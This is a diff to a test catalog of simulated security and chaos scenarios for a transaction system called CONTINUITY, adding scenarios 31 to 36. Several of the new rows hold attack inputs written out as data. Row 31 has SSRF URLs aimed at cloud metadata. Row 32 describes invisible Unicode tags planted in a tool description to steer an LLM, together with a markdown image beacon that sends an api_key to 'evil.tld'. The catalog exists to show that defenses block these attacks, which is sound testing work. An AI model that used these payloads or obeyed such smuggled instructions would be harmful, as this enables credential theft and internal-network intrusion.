@@ -1,10 +1,10 @@
-# Chaos Test Catalog — 30 Deterministic Distributed Failure Scenarios
+# Chaos Test Catalog — 36 Deterministic Distributed Failure Scenarios
 
 **Module:** [`packages/chaos-lab/index.js`](../packages/chaos-lab/index.js)
 **Automated Test Runner:** `node --test tests/chaos/chaos_suite.test.mjs`
-**Interactive Browser Runner:** CONTINUITY UI → **Chaos Lab (30 Scenarios)** tab (`simulation_mode: true`)
+**Interactive Browser Runner:** CONTINUITY UI → **Chaos Lab (36 Scenarios)** tab (`simulation_mode: true`)
 
-> **Simulation Disclosure:** All 30 scenarios execute against isolated in-memory demonstration state and Ed25519 test keypairs. They never mutate external production systems or the user's active mission state.
+> **Simulation Disclosure:** All 36 scenarios execute against isolated in-memory demonstration state and Ed25519 test keypairs. They never mutate external production systems or the user's active mission state.
 
 ---
 
@@ -40,3 +40,9 @@
 | **28** | `CHAOS_28_EARLY_CLICK_BRIDGE_HANDSHAKE_SYNC` | Cold-WAN page load with cross-origin bridge handshake in flight | Visitor clicks `Run the live demo` `10 ms` after open before peer probe resolves | `SYNCHRONIZED` (`ZERO_DROPPED_CLICKS`) | Synchronous listener captures click and awaits `_peerProbePromise` with zero offline downgrade | **No** *(auto-synced)* |
 | **29** | `CHAOS_29_SAME_HOST_BROADCAST_CHANNEL_SPOOF_BLOCKED` | 4 peer subpaths hosted on shared `*.github.io` origin | Sibling subpath broadcasts forged `PEER_COMMITTED` signed with unpinned Ed25519 key | `FORGERY_DROPPED` (`PEER_STATE_INTACT`) | `peer-sync.js` verifies `handoff_token` against `pinnedKey` (`getOrCreateOriginKeyPair`) and drops forgery | **Yes** |
 | **30** | `CHAOS_30_CONTINUOUS_MULTI_WAVE_CHAINED_REPLANNING` | Wave 1 (`Tuesday -> Thursday`) committed & verified | User immediately chains Wave 2 (`Thursday -> Friday`) without manual reset | `CHAINED_CONTINUITY_OK` | Post-commit schedule synchronizes `mission.commitments`, clears lock, and solves Wave 2 cleanly | **Yes** *(approval)* |
+| **31** | `CHAOS_31_SSRF_CLOUD_METADATA_AND_CROSS_ORIGIN_HOCON_ESCAPE` | Conformance auditor & federated resolver active | Attacker supplies `http://169.254.169.254/`, `https://2130706433/`, and cross-origin `hocon` URL | `SSRF_CONTAINED` (`ZERO_CONFUSED_DEPUTY_FETCH`) | `isSafePublicOrLoopbackUrl` & same-origin `hocon` check block metadata/private IPs and confused-deputy fetches | **No** *(fail-closed)* |
+| **32** | `CHAOS_32_UNICODE_TAG_AND_MARKDOWN_BEACON_EXFIL_BLOCKED` | Peer `.network.json` inspected pre-execution | Peer embeds `U+E0041` invisible LLM tags and `![b](https://evil.tld/?api_key=...)` in tool parameter descriptions | `BLOCKED_BY_FIREWALL` (`RISK_100_BLOCKED`) | `@continuity/peer-firewall` triggers `PF-TAG-SMUGGLING` + `PF-MARKDOWN-BEACON-EXFIL` before caller LLM runs | **Yes** |
+| **33** | `CHAOS_33_UNSIGNED_COMMIT_AND_BOOKING_REF_SWAP_REJECTED` | `ReceiptVerifier` active during Saga commit | Provider returns HTTP 200 `COMMITTED` with valid signature for wrong `booking_ref` `MC-OTHER-999` | `DISPATCHED -> NEEDS_USER` | `reconcileOperationOutcome` enforces `booking_ref` & `receipt_envelope` presence and halts | **Yes** |
+| **34** | `CHAOS_34_PARTIAL_PREPARE_HOLD_AUTO_ROLLBACK` | Multi-provider `preparePlan` running | MoveCo places `hold_mc_orphan_guard`, then HomeConnect refuses hold | `PREPARED -> COMPENSATED` (`ZERO_ORPHAN_HOLDS`) | `SagaCoordinator.preparePlan` automatically releases upstream temporary holds when downstream hold fails | **Yes** |
+| **35** | `CHAOS_35_PROVIDER_KEY_ROTATION_AND_COMPROMISED_KEY_REVOCATION` | Multi-key provider Ed25519 ring (`k1`, `k2`) | Provider rotates to `k2` and revokes `k1`; attacker replays old receipt signed with `k1` | `KEY_RING_ENFORCED` (`REVOKED_KEY_BLOCKED`) | `ReceiptVerifier.revokeProviderKey` blocks `k1` while accepting active `k2` | **Yes** |
+| **36** | `CHAOS_36_ICS_VALARM_POISONING_AND_CROSS_MISSION_ZK_REPLAY` | `.ics` calendar import & ZK budget proof check | `.ics` embeds `VALARM DESCRIPTION:Price €0` before `Price €390`; Mission A ZK proof replayed onto Mission B | `VALARM_CLEAN_AND_ZK_SCOPED` | `compileUnstructuredIntake` strips `VALARM` (`€390` kept); `verifyBlindedBudgetAttestation` rejects mission ID mismatch | **No** *(fail-closed)* |
